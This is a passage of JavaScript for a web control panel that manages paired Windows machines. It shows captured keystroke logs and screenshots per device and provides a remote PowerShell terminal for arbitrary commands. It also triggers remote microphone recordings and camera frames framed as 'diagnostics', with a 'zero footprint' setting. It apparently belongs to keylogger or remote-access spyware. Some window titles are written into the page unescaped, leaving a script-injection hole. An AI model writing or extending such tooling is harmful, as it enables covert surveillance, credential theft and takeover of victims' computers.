                    // Enable Copy Command button with valid synced command
                    setCopyBtnState(true, 'Copy Command');

                    // Synchronize countdown immediately and start interval
                    updateBannerOtpTimer();
                    bannerOtpTimer = setInterval(updateBannerOtpTimer, 500);
                    bannerOtpPoll = setInterval(pollBannerOtpStatus, 2500);
                } else {
                    throw new Error(data.error || 'Server rejected OTP generation');
                }
            } catch (err) {
                console.error('Error refreshing OTP:', err);
                if (display) display.innerText = 'ERROR';
                if (cmdInput) cmdInput.value = 'Failed to generate OTP command. Retrying...';
                if (timerEl) { timerEl.innerText = '--:--'; timerEl.style.color = '#ef4444'; }
                if (statusEl) statusEl.innerHTML = `<span style="color:#ef4444;">⚠ Network error generating OTP (${err.message}). Retrying in 5s...</span>`;
                setCopyBtnState(false, 'Unavailable');
                otpRetryTimeout = setTimeout(() => {
                    refreshBannerOtp();
                }, 5000);
            } finally {
                isRefreshingOtp = false;
            }
        }

        function updateBannerOtpTimer() {
            const timerEl = document.getElementById('banner-otp-timer');
            if (!bannerOtpExpiresAt) return;

            const remainingMs = bannerOtpExpiresAt - Date.now();
            const remainingSecs = Math.max(0, Math.ceil(remainingMs / 1000));

            if (remainingSecs <= 0) {
                if (timerEl) {
                    timerEl.innerText = '00:00';
                    timerEl.style.color = '#ef4444';
                }
                // Immediately invalidate so an expired OTP is NEVER copied
                bannerOtp = '';
                bannerOtpExpiresAt = 0;
                setCopyBtnState(false, 'Expired');
                const cmdInput = document.getElementById('banner-otp-cmd');
                if (cmdInput) cmdInput.value = 'OTP expired. Refreshing...';
                if (bannerOtpTimer) { clearInterval(bannerOtpTimer); bannerOtpTimer = null; }
                if (bannerOtpPoll) { clearInterval(bannerOtpPoll); bannerOtpPoll = null; }
                refreshBannerOtp();
                return;
            }

            if (timerEl) {
                timerEl.innerText = formatCountdown(remainingSecs);
                if (remainingSecs <= 10) {
                    timerEl.style.color = '#ef4444';
                } else if (remainingSecs <= 20) {
                    timerEl.style.color = '#f59e0b';
                } else {
                    timerEl.style.color = '#38bdf8';
                }
            }
        }

        async function pollBannerOtpStatus() {
            if (!bannerOtp) return;
            try {
                const res = await fetch(`/api/otp/status?otp=${bannerOtp}`);
                if (!res.ok) return;
                const data = await res.json();
                if (data.status === 'consumed') {
                    if (bannerOtpPoll) { clearInterval(bannerOtpPoll); bannerOtpPoll = null; }
                    if (bannerOtpTimer) { clearInterval(bannerOtpTimer); bannerOtpTimer = null; }
                    const statusEl = document.getElementById('banner-status-text');
                    if (statusEl) statusEl.innerHTML = '<b style="color:#10b981;">✓ New client machine paired and connected successfully!</b>';
                    fetchDevices();
                    setTimeout(refreshBannerOtp, 4000);
                }
            } catch (e) {}
        }

        function copyBannerCmd() {
            // Strict security check: never copy if OTP is expired or absent
            if (!bannerOtp || !bannerOtpExpiresAt || Date.now() >= bannerOtpExpiresAt) {
                setCopyBtnState(false, 'Expired');
                refreshBannerOtp();
                return;
            }

            const input = document.getElementById('banner-otp-cmd');
            if (!input || !input.value || input.value.indexOf(bannerOtp) === -1) {
                return;
            }

            input.select();
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(input.value).catch(() => {
                    document.execCommand('copy');
                });
            } else {
                document.execCommand('copy');
            }

            const btn = document.getElementById('banner-copy-btn');
            if (btn) {
                btn.innerHTML = '<svg style="width:14px;height:14px;" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7"></path></svg> Copied!';
                btn.style.background = '#10b981';
                setTimeout(() => {
                    if (bannerOtp && Date.now() < bannerOtpExpiresAt) {
                        setCopyBtnState(true, 'Copy Command');
                        btn.style.background = 'var(--accent)';
                    }
                }, 2000);
            }
        }

        // Auto-refresh when tab becomes visible or receives focus after dormancy
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden) {
                if (!bannerOtp || !bannerOtpExpiresAt || Date.now() >= bannerOtpExpiresAt) {
                    refreshBannerOtp();
                } else {
                    updateBannerOtpTimer();
                }
            }
        });

        window.addEventListener('focus', () => {
            if (!bannerOtp || !bannerOtpExpiresAt || Date.now() >= bannerOtpExpiresAt) {
                refreshBannerOtp();
            } else {
                updateBannerOtpTimer();
            }
        });

        // ==================== REMOTE POWERSHELL TERMINAL ====================
        let terminalPollInterval = null;
        let terminalCurrentCommandId = null;
        let terminalPollCount = 0;

        function openTerminalModal() {
            if (!selectedDevice) return;
            const d = allDevices.find(dev => dev.device_id === selectedDevice);
            const label = d ? (d.nickname || d.device_id.substring(0, 12) + '...') : selectedDevice;
            document.getElementById('terminal-device-label').innerText = label;
            const modal = document.getElementById('terminal-modal');
            modal.style.display = 'flex';
            setTimeout(() => {
                modal.style.opacity = '1';
                modal.style.pointerEvents = 'auto';
                document.getElementById('terminal-input').focus();
            }, 50);
        }

        function closeTerminalModal() {
            const modal = document.getElementById('terminal-modal');
            modal.style.opacity = '0';
            modal.style.pointerEvents = 'none';
            if (terminalPollInterval) { clearInterval(terminalPollInterval); terminalPollInterval = null; }
            setTimeout(() => { modal.style.display = 'none'; }, 200);
        }

        function setTerminalCmd(cmd) {
            document.getElementById('terminal-input').value = cmd;
            document.getElementById('terminal-input').focus();
        }

        function terminalLog(text, color) {
            const out = document.getElementById('terminal-output');
            const span = document.createElement('span');
            span.style.color = color || '#e6edf3';
            span.textContent = text + String.fromCharCode(10);
            out.appendChild(span);
            out.scrollTop = out.scrollHeight;
        }

        async function sendTerminalCommand() {
            const input = document.getElementById('terminal-input');
            const cmd = input.value.trim();
            if (!cmd || !selectedDevice) return;

            if (terminalPollInterval) { clearInterval(terminalPollInterval); terminalPollInterval = null; }

            terminalLog('PS > ' + cmd, '#3fb950');
            input.value = '';
            document.getElementById('terminal-send-btn').disabled = true;
            document.getElementById('terminal-send-btn').innerText = 'Waiting...';
            terminalLog('⏳ Dispatching command to device...', '#8b949e');

            try {
                const res = await fetch('/api/devices/command', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ device_id: selectedDevice, command: cmd })
                });
                const data = await res.json();
                if (!res.ok) {
                    terminalLog('✗ Error: ' + (data.error || 'Failed to dispatch'), '#f85149');
                    document.getElementById('terminal-send-btn').disabled = false;
                    document.getElementById('terminal-send-btn').innerText = 'Run';
                    return;
                }
                terminalCurrentCommandId = data.command_id;
                terminalPollCount = 0;
                terminalLog('📡 Command dispatched (ID: ' + data.command_id.substring(0, 8) + '). Waiting for client to run it...', '#8b949e');
                // Check immediately at 800ms, then every 1.5s for fast real-time feedback
                setTimeout(pollTerminalResult, 800);
                terminalPollInterval = setInterval(pollTerminalResult, 1500);
            } catch (err) {
                terminalLog('✗ Network error: ' + err.message, '#f85149');
                document.getElementById('terminal-send-btn').disabled = false;
                document.getElementById('terminal-send-btn').innerText = 'Run';
            }
        }

        async function pollTerminalResult() {
            terminalPollCount++;
            if (terminalPollCount > 120) {
                clearInterval(terminalPollInterval); terminalPollInterval = null;
                terminalLog('⏱ Timeout: No response from device after 3 minutes. Target device may be offline or busy.', '#f85149');
                document.getElementById('terminal-send-btn').disabled = false;
                document.getElementById('terminal-send-btn').innerText = 'Run';
                return;
            }
            try {
                const res = await fetch(`/api/devices/command/result?device_id=${encodeURIComponent(selectedDevice)}&command_id=${encodeURIComponent(terminalCurrentCommandId)}`);
                const data = await res.json();
                if (data.status === 'completed' && data.result) {
                    clearInterval(terminalPollInterval); terminalPollInterval = null;
                    const r = data.result;
                    const exitColor = r.exit_code === 0 ? '#3fb950' : '#f85149';
                    terminalLog('─'.repeat(60), '#30363d');
                    if (r.output && r.output.trim()) {
                        terminalLog(r.output, '#e6edf3');
                    } else {
                        terminalLog('(no output)', '#8b949e');
                    }
                    terminalLog(String.fromCharCode(10) + `✓ Exit code: ${r.exit_code}  |  Completed: ${new Date(r.completed_at).toLocaleTimeString()}`, exitColor);
                    terminalLog('─'.repeat(60), '#30363d');
                    document.getElementById('terminal-send-btn').disabled = false;
                    document.getElementById('terminal-send-btn').innerText = 'Run';
                    document.getElementById('terminal-input').focus();
                }
                // else keep polling (pending/dispatched)
            } catch (err) {
                // ignore transient poll errors
            }
        }
        // ==================== END REMOTE TERMINAL ====================

        // ==================== AV DIAGNOSTICS & MEDIA SESSIONS ====================
        let avPollInterval = null;
        let avCurrentCommandId = null;

        function openAvModal() {
            if (!selectedDevice) return;
            const d = allDevices.find(dev => dev.device_id === selectedDevice);
            const label = d ? (d.nickname || d.device_id) : selectedDevice;
            document.getElementById('av-device-label').innerText = label;
            document.getElementById('av-status-text').innerHTML = 'Ready. Select a diagnostic test above to initiate an authorized session.';
            document.getElementById('av-audio-player').style.display = 'none';
            document.getElementById('av-camera-img').style.display = 'none';

            const modal = document.getElementById('av-modal');
            modal.style.display = 'flex';
            setTimeout(() => {
                modal.style.opacity = '1';
                modal.style.pointerEvents = 'auto';
            }, 50);
        }

        function closeAvModal() {
            const modal = document.getElementById('av-modal');
            modal.style.opacity = '0';
            modal.style.pointerEvents = 'none';
            if (avPollInterval) { clearInterval(avPollInterval); avPollInterval = null; }
            setTimeout(() => { modal.style.display = 'none'; }, 200);
        }

        async function startAvDiagnostic(mode) {
            if (!selectedDevice) return;
            const statusEl = document.getElementById('av-status-text');
            const audioPlayer = document.getElementById('av-audio-player');
            const cameraImg = document.getElementById('av-camera-img');
            audioPlayer.style.display = 'none';
            cameraImg.style.display = 'none';

            statusEl.innerHTML = `<span style="color:#38bdf8;">⏳ Requesting ${mode} diagnostic session from device... (Privacy indicators active on client)</span>`;
            document.getElementById('btn-diag-audio').disabled = true;
            document.getElementById('btn-diag-camera').disabled = true;

            try {
                const res = await fetch('/api/devices/av/start', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ device_id: selectedDevice, mode: mode, duration: 5 })
                });
                const data = await res.json();
                if (!res.ok) {
                    statusEl.innerHTML = `<span style="color:#ef4444;">✗ Failed: ${data.error || 'Server error'}</span>`;
                    document.getElementById('btn-diag-audio').disabled = false;
                    document.getElementById('btn-diag-camera').disabled = false;
                    return;
                }
                avCurrentCommandId = data.command_id;
                statusEl.innerHTML = `<span style="color:#f59e0b;">📡 Session dispatched. Client machine is executing diagnostic (${mode === 'audio' ? 'recording 5s audio' : 'capturing frame'})...</span>`;
                
                let pollAttempts = 0;
                if (avPollInterval) clearInterval(avPollInterval);
                avPollInterval = setInterval(async () => {
                    pollAttempts++;
                    if (pollAttempts > 40) {
                        clearInterval(avPollInterval); avPollInterval = null;
                        statusEl.innerHTML = '<span style="color:#ef4444;">⏱ Timeout: Client did not respond within 3 minutes.</span>';
                        document.getElementById('btn-diag-audio').disabled = false;
                        document.getElementById('btn-diag-camera').disabled = false;
                        return;
                    }
                    try {
                        const sRes = await fetch(`/api/devices/av/status?device_id=${encodeURIComponent(selectedDevice)}&command_id=${encodeURIComponent(avCurrentCommandId)}`);
                        const sData = await sRes.json();
                        if (sData.status === 'completed') {
                            clearInterval(avPollInterval); avPollInterval = null;
                            document.getElementById('btn-diag-audio').disabled = false;
                            document.getElementById('btn-diag-camera').disabled = false;

                            if (sData.result_status === 'blocked') {
                                statusEl.innerHTML = `<b style="color:#f59e0b;">⚠ Windows Security Restriction:</b><br>${sData.error || 'Privacy settings or hardware lock prevented access.'}`;
                            } else if (sData.mode === 'audio') {
                                statusEl.innerHTML = `<b style="color:#10b981;">✓ Decrypted Audio Diagnostic Sample (AES-256-GCM Verified):</b>`;
                                audioPlayer.src = `/api/devices/av/stream/${encodeURIComponent(selectedDevice)}/${encodeURIComponent(avCurrentCommandId)}`;
                                audioPlayer.style.display = 'block';
                                audioPlayer.play().catch(() => {});
                            } else if (sData.mode === 'camera') {
                                statusEl.innerHTML = `<b style="color:#10b981;">✓ Decrypted Camera Diagnostic Frame (AES-256-GCM Verified):</b>`;
                                cameraImg.src = `/api/devices/av/stream/${encodeURIComponent(selectedDevice)}/${encodeURIComponent(avCurrentCommandId)}`;
                                cameraImg.style.display = 'block';
                            }
                        }
                    } catch (e) {}
                }, 4000);
            } catch (err) {
                statusEl.innerHTML = `<span style="color:#ef4444;">✗ Network error: ${err.message}</span>`;
                document.getElementById('btn-diag-audio').disabled = false;
                document.getElementById('btn-diag-camera').disabled = false;
            }
        }
        
        async function saveSettings() {
            const nickname = document.getElementById('settings-nickname').value;
            const isDisabled = document.getElementById('settings-is-disabled').checked;
            const disableMouse = document.getElementById('settings-disable-mouse').checked;
            const zeroFootprint = document.getElementById('settings-zero-footprint').checked;
            const periodicInterval = parseInt(document.getElementById('settings-periodic-interval').value);
            const idleThreshold = parseInt(document.getElementById('settings-idle-threshold').value);
            const onlySwitch = document.getElementById('settings-only-switch').checked;
            
            try {
                // 1. Rename nickname if modified
                await fetch('/api/devices/rename', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ device_id: selectedDevice, nickname: nickname })
                });
                
                // 2. Save settings configuration
                const res = await fetch('/api/devices/config', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        device_id: selectedDevice,
                        is_disabled: isDisabled,
                        disable_mouse_clicks: disableMouse,
                        zero_footprint: zeroFootprint,
                        periodic_screenshot_interval: periodicInterval,
                        idle_threshold: idleThreshold,
                        only_capture_on_switch: onlySwitch
                    })
                });
                
                if (res.ok) {
                    closeSettingsModal();
                    await fetchDevices();
                } else {
                    alert("Failed to save configuration.");
                }
            } catch (err) {
                console.error("Error saving settings:", err);
            }
        }

        async function fetchDevices() {
            try {
                const res = await fetch('/api/devices');
                const devices = await res.json();
                allDevices = devices;
                
                const select = document.getElementById('device-select');
                select.innerHTML = '';
                devices.forEach(d => {
                    const option = document.createElement('option');
                    option.value = d.device_id;
                    option.innerText = d.nickname || d.device_id;
                    select.appendChild(option);
                });
                
                renderDevicesGrid(devices);
                
                if (selectedDevice && devices.some(d => d.device_id === selectedDevice)) {
                    select.value = selectedDevice;
                    updateDeviceStatus();
                }
            } catch (err) {
                console.error("Error fetching devices:", err);
            }
        }
        
        function changeDevice(deviceId) {
            selectedDevice = deviceId;
            localStorage.setItem('selectedDevice', deviceId);
            selectedLogKeys.clear();
            selectedScreenshotFilenames.clear();
            updateDeviceStatus();
            fetchLogs();
            fetchScreenshots();
        }
        
        async function promptRenameDevice() {
            if (!selectedDevice) return;
            const select = document.getElementById('device-select');
            const currentNickname = select.options[select.selectedIndex] ? select.options[select.selectedIndex].text : selectedDevice;
            
            const newName = prompt("Enter a new nickname for this device:", currentNickname);
            if (newName === null || newName.trim() === '') return;
            
            try {
                const res = await fetch('/api/devices/rename', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ device_id: selectedDevice, nickname: newName.trim() })
                });
                if (res.ok) {
                    await fetchDevices();
                    const d = allDevices.find(dev => dev.device_id === selectedDevice);
                    if (d) {
                        d.nickname = newName.trim();
                        document.getElementById('detail-device-title').innerText = d.nickname;
                    }
                } else {
                    alert("Failed to rename device");
                }
            } catch (err) {
                console.error("Error renaming device:", err);
            }
        }
        
        function getRelativeTimeString(dateIso) {
            if (!dateIso) return "Never active";
            const date = new Date(dateIso);
            const now = new Date();
            const diffMs = now - date;
            const diffMins = Math.floor(diffMs / 60000);
            
            if (diffMins < 1) return "Just now";
            if (diffMins < 60) return `${diffMins}m ago`;
            
            const diffHours = Math.floor(diffMins / 60);
            if (diffHours < 24) return `${diffHours}h ago`;
            
            const diffDays = Math.floor(diffHours / 24);
            return `${diffDays}d ago`;
        }

        function renderDevicesGrid(devices) {
            const grid = document.getElementById('devices-grid');
            document.getElementById('device-count-badge').innerText = devices.length;
            
            if (devices.length === 0) {
                grid.innerHTML = '<div class="no-data" style="grid-column: 1 / -1;">No monitored devices registered yet.</div>';
                return;
            }
            
            let html = '';
            devices.forEach(d => {
                const lastActiveDate = new Date(d.last_active);
                const isOnline = (new Date() - lastActiveDate) < 120000;
                
                const statusClass = isOnline ? 'online' : 'offline';
                const statusText = isOnline ? 'Online' : 'Offline';
                const relativeActive = getRelativeTimeString(d.last_active);
                
                html += `
                    <div class="device-card" onclick="selectDeviceDetails('${d.device_id}')">
                        <div class="device-card-header">
                            <div>
                                <div class="device-card-name">${escapeHtml(d.nickname || d.device_id)}</div>
                                <div class="device-card-id">${d.device_id}</div>
                            </div>
                            <div style="display: flex; flex-direction: column; align-items: flex-end; gap: 0.5rem;">
                                <span class="status-badge ${statusClass}">
                                    <span class="status-dot"></span>
                                    ${statusText}
                                </span>
                                <button onclick="event.stopPropagation(); deleteDeviceCard('${d.device_id}')" style="background-color: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); color: #ef4444; font-size: 0.75rem; font-weight: 600; padding: 0.2rem 0.5rem; border-radius: 4px; cursor: pointer; transition: all 0.2s;" title="Delete Device">Delete</button>
                            </div>
                        </div>
                        <div style="display:flex; justify-content:space-between; align-items:center; margin-top: auto; font-size:0.8rem; color:var(--text-muted); border-top: 1px solid var(--border); padding-top:0.75rem;">
                            <span>Last Active:</span>
                            <span style="font-weight: 500; color: var(--text-main);">${relativeActive}</span>
                        </div>
                    </div>
                `;
            });
            grid.innerHTML = html;
        }

        async function deleteDeviceCard(deviceId) {
            if (!confirm(`Are you sure you want to delete the device "${deviceId}"? This will also purge its database activity logs.`)) {
                return;
            }
            try {
                const res = await fetch(`/api/devices/delete?device_id=${encodeURIComponent(deviceId)}`, {
                    method: 'DELETE'
                });
                if (res.ok) {
                    await fetchDevices();
                } else {
                    alert("Failed to delete device");
                }
            } catch (err) {
                console.error("Error deleting device:", err);
            }
        }

        async function purgeSelectedDateRange() {
            if (!selectedDevice) return;
            let rangeMsg = "";
            if (datePreset === 'today') {
                rangeMsg = "today's activity";
            } else if (datePreset === 'range') {
                rangeMsg = `activity from ${startDate} to ${endDate}`;
            } else {
                rangeMsg = "entire user dataset (ALL TIME)";
            }
            
            const message = `Are you sure you want to permanently delete ALL activity logs and screenshots for this device (${selectedDevice}) matching ${rangeMsg}? This action CANNOT be undone and will clear records even if they are not fully loaded in the browser.`;
            if (!confirm(message)) {
                return;
            }
            try {
                const res = await fetch('/api/logs/purge-range', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        device_id: selectedDevice,
                        start_date: startDate,
                        end_date: endDate
                    })
                });
                if (res.ok) {
                    const data = await res.json();
                    alert(`Purge completed! Successfully deleted ${data.deleted_count || 0} log entries and their associated screenshots.`);
                    fetchLogs();
                    fetchScreenshots();
                } else {
                    alert("Failed to purge date range.");
                }
            } catch (err) {
                console.error("Error purging date range:", err);
            }
        }

        let datePreset = localStorage.getItem('datePreset') || 'today';

        function changeDatePreset(val) {
            datePreset = val;
            localStorage.setItem('datePreset', val);
            
            const startWrapper = document.getElementById('start-date-wrapper');
            const endWrapper = document.getElementById('end-date-wrapper');
            const purgeBtn = document.getElementById('purge-btn');
            
            if (val === 'today') {
                startWrapper.style.display = 'none';
                endWrapper.style.display = 'none';
                const todayStr = new Date().toISOString().split('T')[0];
                startDate = todayStr;
                endDate = todayStr;
                if (purgeBtn) purgeBtn.innerText = "Purge Today";
            } else if (val === 'range') {
                startWrapper.style.display = 'flex';
                endWrapper.style.display = 'flex';
                startDate = document.getElementById('start-date-input').value || new Date().toISOString().split('T')[0];
                endDate = document.getElementById('end-date-input').value || new Date().toISOString().split('T')[0];
                if (purgeBtn) purgeBtn.innerText = "Purge Range";
            } else if (val === 'all') {
                startWrapper.style.display = 'none';
                endWrapper.style.display = 'none';
                startDate = '';
                endDate = '';
                if (purgeBtn) purgeBtn.innerText = "Purge All Time";
            }
            
            fetchLogs();
            fetchScreenshots();
        }

        function selectDeviceDetails(deviceId) {
            selectedDevice = deviceId;
            localStorage.setItem('selectedDevice', deviceId);
            document.getElementById('device-select').value = deviceId;
            
            const d = allDevices.find(dev => dev.device_id === deviceId);
            document.getElementById('detail-device-title').innerText = d ? (d.nickname || d.device_id) : deviceId;
            document.getElementById('detail-device-subtitle').innerText = d ? `Keystroke logs & screenshots for device ${d.device_id}` : `Keystroke logs & screenshots`;
            
            document.getElementById('landing-page').style.display = 'none';
            document.getElementById('detail-page').style.display = 'block';
            
            const lastActiveDate = d ? new Date(d.last_active) : new Date();
            const isOnline = d ? (new Date() - lastActiveDate) < 120000 : false;
            const dot = document.getElementById('detail-live-dot');
            const txt = document.getElementById('detail-live-status-text');
            if (isOnline) {
                dot.style.backgroundColor = 'var(--live)';
                txt.innerText = 'ONLINE CONNECTED';
            } else {
                dot.style.backgroundColor = 'var(--text-muted)';
                txt.innerText = 'OFFLINE DISCONNECTED';
            }
            
            selectedLogKeys.clear();
            selectedScreenshotFilenames.clear();
            updateDeviceStatus();
            fetchLogs();
            fetchScreenshots();
        }

        function goBackToDevices() {
            selectedDevice = '';
            localStorage.removeItem('selectedDevice');
            
            document.getElementById('detail-page').style.display = 'none';
            document.getElementById('landing-page').style.display = 'block';
            
            fetchDevices();
        }
        
        function changeDateRange() {
            startDate = document.getElementById('start-date-input').value;
            endDate = document.getElementById('end-date-input').value;
            localStorage.setItem('startDate', startDate);
            localStorage.setItem('endDate', endDate);
            
            selectedLogKeys.clear();
            selectedScreenshotFilenames.clear();
            fetchLogs();
            fetchScreenshots();
        }
        
        async function fetchLogs() {
            if (!selectedDevice) return;
            const isAllTime = datePreset === 'all';
            if (!isAllTime && (!startDate || !endDate)) {
                document.getElementById('logs-list').innerHTML = '<div class="no-data">No logs found for this timeframe.</div>';
                document.getElementById('logs-action-bar').style.display = 'none';
                return;
            }
            try {
                const res = await fetch(`/api/logs?all_time=${isAllTime}&start_date=${startDate}&end_date=${endDate}&device_id=${selectedDevice}`);
                const data = await res.json();
                allLogs = data;
                applyFilters();
            } catch (err) {
                console.error("Error fetching logs:", err);
            }
        }
        
        async function fetchScreenshots() {
            if (!selectedDevice) return;
            const isAllTime = datePreset === 'all';
            if (!isAllTime && (!startDate || !endDate)) {
                document.getElementById('screenshots-grid').innerHTML = '<div class="no-data" style="grid-column: 1 / -1;">No screenshots found for this timeframe.</div>';
                document.getElementById('screenshots-action-bar').style.display = 'none';
                return;
            }
            try {
                const res = await fetch(`/api/screenshots?all_time=${isAllTime}&start_date=${startDate}&end_date=${endDate}&device_id=${selectedDevice}`);
                const data = await res.json();
                allScreenshots = data;
                applyFilters();
            } catch (err) {
                console.error("Error fetching screenshots:", err);
            }
        }
        
        function getAppName(windowTitle) {
            if (!windowTitle) return "Unknown Application";
            const parts = windowTitle.split(" - ");
            if (parts.length > 1) {
                return parts[parts.length - 1].trim();
            }
            return windowTitle;
        }
        
        function applyFilters() {
            const query = document.getElementById('search-input').value.toLowerCase().trim();
            const groupChecked = document.getElementById('group-checkbox').checked;
            
            let filteredLogs = allLogs.filter(log => {
                const textMatch = log.text && log.text.toLowerCase().includes(query);
                const windowMatch = log.window && log.window.toLowerCase().includes(query);
                const appMatch = log.window && getAppName(log.window).toLowerCase().includes(query);
                return !query || textMatch || windowMatch || appMatch;
            });
            
            let filteredScreenshots = allScreenshots.filter(img => {
                const windowMatch = img.window && img.window.toLowerCase().includes(query);
                const appMatch = img.window && getAppName(img.window).toLowerCase().includes(query);
                return !query || windowMatch || appMatch;
            });
            
            renderLogs(filteredLogs, groupChecked);
            renderScreenshots(filteredScreenshots);
        }
        
        function renderLogs(logsList, groupChecked) {
            const container = document.getElementById('logs-list');
            const actionBar = document.getElementById('logs-action-bar');
            
            if (logsList.length > 0) {
                actionBar.style.display = 'flex';
            } else {
                actionBar.style.display = 'none';
                container.innerHTML = '<div class="no-data">No activity logs found.</div>';
                return;
            }
            
            let displayData = [...logsList];
            if (selectedSort === 'desc') {
                displayData.reverse();
            }
            
            let html = '';
            
            if (groupChecked) {
                const groups = {};
                displayData.forEach(log => {
                    const app = getAppName(log.window);
                    if (!groups[app]) groups[app] = [];
                    groups[app].push(log);
                });
                
                Object.keys(groups).forEach(app => {
                    const appLogs = groups[app];
                    html += `
                        <div class="app-group" style="margin-bottom: 1.5rem; border: 1px solid var(--border); border-radius: 8px; overflow: hidden; background-color: var(--bg-card);">
                            <div class="app-group-header" onclick="toggleGroupCollapse(this)" style="display: flex; justify-content: space-between; align-items: center; background-color: rgba(99, 102, 241, 0.08); padding: 0.75rem 1rem; border-bottom: 1px solid var(--border); cursor: pointer; user-select: none;">
                                <span style="font-weight: 600; color: #818cf8; font-size: 0.95rem;">${escapeHtml(app)} (${appLogs.length} Entries)</span>
                                <svg style="width:14px;height:14px;transition: transform 0.2s; transform: rotate(90deg);" fill="none" stroke="currentColor" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7"></path></svg>
                            </div>
                            <div class="app-group-body" style="display: block;">
                    `;
                    
                    appLogs.forEach(log => {
                        html += getLogCardHtml(log);
                    });
                    
                    html += `
                            </div>
                        </div>
                    `;
                });
            } else {
                displayData.forEach(log => {
                    html += getLogCardHtml(log);
                });
            }
            
            container.innerHTML = html;
            updateLogSelection();
        }
        
        function toggleGroupCollapse(header) {
            const body = header.nextElementSibling;
            const icon = header.querySelector('svg');
            if (body.style.display === 'none') {
                body.style.display = 'block';
                icon.style.transform = 'rotate(90deg)';
            } else {
                body.style.display = 'none';
                icon.style.transform = 'rotate(0deg)';
            }
        }
        
        function getLogCardHtml(log) {
            let inlineScreenshot = '';
            if (log.screenshot) {
                inlineScreenshot = `
                    <div style="margin-top: 0.75rem; padding-left: 2rem;">
                        <img src="${log.screenshot}" alt="Screenshot" 
                             style="max-width: 380px; max-height: 220px; width: auto; height: auto; border-radius: 8px; border: 1px solid var(--border); cursor: pointer; transition: transform 0.2s ease, box-shadow 0.2s ease; box-shadow: 0 4px 12px rgba(0,0,0,0.25);" 
                             onclick="openImage('${log.screenshot}')"
                             onmouseover="this.style.transform='scale(1.02)'; this.style.boxShadow='0 8px 24px rgba(0,0,0,0.35)';" 
                             onmouseout="this.style.transform='scale(1)'; this.style.boxShadow='0 4px 12px rgba(0,0,0,0.25)';"
                             onerror="this.style.display='none';">
                    </div>
                `;
            }
            
            const escapedText = log.text.replace(/'/g, "\\'").replace(/"/g, "&quot;");
            const key = `${log.timestamp}||${escapedText}`;
            const isChecked = selectedLogKeys.has(key) ? 'checked' : '';
            
            return `
                <div class="log-card" style="padding-bottom: 1.25rem;">
                    <div class="log-meta">
                        <div class="checkbox-container">
                            <input type="checkbox" class="card-checkbox log-item-checkbox" data-timestamp="${log.timestamp}" data-text="${escapedText}" ${isChecked} onchange="updateLogSelection()">
                        </div>
                        <span class="log-time">${log.timestamp}</span>
                        <span class="log-window" title="${log.window}">${log.window}</span>
                        <button class="delete-icon-btn" onclick="deleteLog('${log.timestamp}', '${escapedText}')" title="Delete Log Entry">
                            &times; Delete
                        </button>
                    </div>
                    <div class="log-text" style="padding-left: 2rem; font-weight: 500; font-size: 0.95rem; color: var(--text-main);">${escapeHtml(log.text)}</div>
                    ${inlineScreenshot}
                </div>
            `;
        }
        
        function renderScreenshots(screenshotsList) {
            const container = document.getElementById('screenshots-grid');
            const actionBar = document.getElementById('screenshots-action-bar');
            
            if (screenshotsList.length > 0) {
                actionBar.style.display = 'flex';
            } else {
                actionBar.style.display = 'none';
                container.innerHTML = '<div class="no-data" style="grid-column: 1 / -1;">No screenshots found.</div>';
                return;
            }
            
            let displayData = [...screenshotsList];
            if (selectedSort === 'desc') {
                displayData.reverse();
            }
            
            let html = '';
            displayData.forEach(img => {
                const isChecked = selectedScreenshotFilenames.has(img.filename) ? 'checked' : '';
                
                html += `
                    <div class="screenshot-card" onclick="openImage('${img.url}', '${img.filename}')">
                        <div class="screenshot-checkbox-wrapper" onclick="event.stopPropagation();">
                            <input type="checkbox" class="card-checkbox screenshot-item-checkbox" data-filename="${img.filename}" ${isChecked} onchange="updateScreenshotSelection()">
                        </div>
                        <div class="img-container">
                            <img src="${img.url}" loading="lazy" alt="Screenshot">
                        </div>
                        <div class="screenshot-info">
                            <div class="screenshot-window" title="${img.window}">${img.window}</div>
                            <div class="screenshot-time">${img.time}</div>
                            <button class="delete-btn" onclick="event.stopPropagation(); deleteScreenshot('${img.filename}')">
                                Delete Image
                            </button>
                        </div>
                    </div>
                `;
            });
            
            container.innerHTML = html;
            updateScreenshotSelection();
        }
        
        // Selection handlers for Logs
        function toggleSelectAllLogs(selectAllBox) {
            const checkboxes = document.querySelectorAll('.log-item-checkbox');
            checkboxes.forEach(box => {
                box.checked = selectAllBox.checked;
                const key = `${box.getAttribute('data-timestamp')}||${box.getAttribute('data-text')}`;
                if (selectAllBox.checked) {
                    selectedLogKeys.add(key);
                } else {
                    selectedLogKeys.delete(key);
                }
            });
            updateLogSelection();
        }
        
        function updateLogSelection() {
            const checkboxes = document.querySelectorAll('.log-item-checkbox');
            checkboxes.forEach(box => {
                const key = `${box.getAttribute('data-timestamp')}||${box.getAttribute('data-text')}`;
                if (box.checked) {
                    selectedLogKeys.add(key);
                } else {
                    selectedLogKeys.delete(key);
                }
            });
            
            const checkedCount = selectedLogKeys.size;
            const btn = document.getElementById('bulk-delete-logs-btn');
            btn.disabled = checkedCount === 0;
            btn.innerText = `Delete Selected (${checkedCount})`;
            
            const selectAllBox = document.getElementById('select-all-logs');
            if (checkboxes.length > 0) {
                const allChecked = Array.from(checkboxes).every(box => {
                    const key = `${box.getAttribute('data-timestamp')}||${box.getAttribute('data-text')}`;
                    return selectedLogKeys.has(key);
                });
                selectAllBox.checked = allChecked;
            } else {
                selectAllBox.checked = false;
            }
        }
        
        async function deleteLog(timestamp, text) {
            if (!confirm("Are you sure you want to delete this log entry? (This will also delete the associated screenshot if present)")) {
                return;
            }
            try {
